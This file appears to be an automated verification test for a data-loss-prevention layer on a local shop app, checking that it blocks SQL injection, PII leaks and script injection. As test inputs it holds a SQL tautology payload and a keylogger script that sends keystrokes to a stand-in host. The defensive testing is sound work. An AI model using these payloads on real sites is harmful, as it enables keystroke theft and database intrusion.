/**
 * Automated System Verification Test
 * Tests API endpoints, SQL Injection interception, Honeypot responses,
 * Contextual behavioral scoring, AESX encryption/tamper verification, and Attack Simulations.
 */

async function runTests() {
  const BASE_URL = 'http://localhost:3000';
  let passed = 0;
  let failed = 0;

  function assert(condition, message) {
    if (condition) {
      console.log(`  ✓ PASS: ${message}`);
      passed++;
    } else {
      console.error(`  ✗ FAIL: ${message}`);
      failed++;
    }
  }

  console.log('\n--- 1. Testing Product Catalog API ---');
  try {
    const res = await fetch(`${BASE_URL}/api/products`);
    const data = await res.json();
    assert(res.status === 200, 'Catalog endpoint returns HTTP 200');
    assert(data.success === true, 'Catalog response has success = true');
    assert(Array.isArray(data.products) && data.products.length > 0, `Products loaded (${data.products.length} items)`);
  } catch (err) {
    assert(false, `Catalog API error: ${err.message}`);
  }

  console.log('\n--- 2. Testing Benign Search Query ---');
  try {
    const res = await fetch(`${BASE_URL}/api/products/search`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query: 'Titan', bypassDlp: false })
    });
    const data = await res.json();
    assert(res.status === 200, 'Benign search returns HTTP 200');
    assert(data.products.length >= 1, 'Product matches expected search term');
    assert(data.dlpResult.contentReport.isThreat === false, 'DLP flagged benign query as CLEAN');
  } catch (err) {
    assert(false, `Benign search error: ${err.message}`);
  }

  console.log('\n--- 3. Testing SQL Injection Interception (Tautology: \' OR \'1\'=\'1) ---');
  try {
    const res = await fetch(`${BASE_URL}/api/products/search`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query: "' OR '1'='1", bypassDlp: false })
    });
    const data = await res.json();
    assert(res.status === 403 || data.blocked === true || data.isHoneypot === true, 'DLP intercepted SQL injection');
    assert(data.dlpResult.contentReport.isThreat === true, 'Content inspector correctly identified threat');
    assert(data.dlpResult.contentReport.matches.some(m => m.ruleId === 'SQLI_TAUTOLOGY'), 'Matched SQLI_TAUTOLOGY rule');
  } catch (err) {
    assert(false, `SQL injection test error: ${err.message}`);
  }

  console.log('\n--- 4. Testing Outbound PII / Financial Leak Detection ---');
  try {
    const res = await fetch(`${BASE_URL}/api/messages/send`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: 'Customer leaked card: 4532718293847561 and SSN: 234-56-7890',
        username: 'suspicious_tester'
      })
    });
    const data = await res.json();
    assert(res.status === 403 || data.blocked === true, 'Message containing valid Luhn CC & SSN blocked');
    assert(data.dlpResult.contentReport.matches.some(m => m.category === 'PII_LEAK'), 'PII leak rules triggered');
  } catch (err) {
    assert(false, `PII leak test error: ${err.message}`);
  }

  console.log('\n--- 5. Testing Keystroke Theft / Keylogger Injection ---');
  try {
    const res = await fetch(`${BASE_URL}/api/messages/send`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: '<script>window.addEventListener("keypress", function(e){ fetch("http://logger.cc?k=" + e.key); });</script>',
        username: 'malicious_script_tester'
      })
    });
    const data = await res.json();
    assert(res.status === 403 || data.blocked === true, 'Keylogger injection payload blocked');
    assert(data.dlpResult.contentReport.matches.some(m => m.ruleId === 'KEYSTROKE_THEFT_INJECTION'), 'Caught KEYSTROKE_THEFT_INJECTION rule');
  } catch (err) {
    assert(false, `Keylogger test error: ${err.message}`);
  }

  console.log('\n--- 6. Testing AESX Database Vault & Tamper Resistance ---');
  try {
    const res = await fetch(`${BASE_URL}/api/dlp/vault`);
    const data = await res.json();
    assert(res.status === 200, 'Vault endpoint returns HTTP 200');
    assert(data.vaultProfiles.length > 0, `Found ${data.vaultProfiles.length} customer records in vault`);
    assert(data.vaultProfiles[0].encrypted.creditCard.startsWith('AESX$'), 'Credit card stored in AESX$[iv]$[authTag]$[ciphertext] format');

    // Test Tamper resistance
    const tamperRes = await fetch(`${BASE_URL}/api/dlp/vault/tamper-test`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({})
    });
    const tamperData = await tamperRes.json();
    assert(tamperData.success === true, 'Tamper test executed');
    assert(tamperData.result.success === true, 'Ciphertext bit tampering successfully rejected by AES-GCM AuthTag');
  } catch (err) {
    assert(false, `Vault & tamper test error: ${err.message}`);
  }

  console.log('\n--- 7. Testing Attack Simulation API ---');
  try {
    const res = await fetch(`${BASE_URL}/api/dlp/simulate-attack`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ attackType: 'SQLI_UNION_EXFILTRATION' })
    });
    const data = await res.json();
    assert(res.status === 200, 'Simulation endpoint returns HTTP 200');
    assert(data.attackResult.inspection.contentReport.isThreat === true, 'Union exfiltration flagged as threat');
  } catch (err) {
    assert(false, `Attack simulation error: ${err.message}`);
  }

  console.log('\n--- 8. Testing SOC Incident Audit Log ---');
  try {
    const res = await fetch(`${BASE_URL}/api/dlp/incidents`);
    const data = await res.json();
    assert(res.status === 200, 'Incidents audit log endpoint returns HTTP 200');
    assert(data.incidents.length > 0, `Recorded ${data.incidents.length} security incidents in audit log`);
  } catch (err) {
    assert(false, `Incidents API error: ${err.message}`);
  }

  console.log('\n========================================');
  console.log(` System Verification Results: ${passed} PASSED, ${failed} FAILED`);
  console.log('========================================\n');

  if (failed > 0) process.exit(1);
}

runTests();
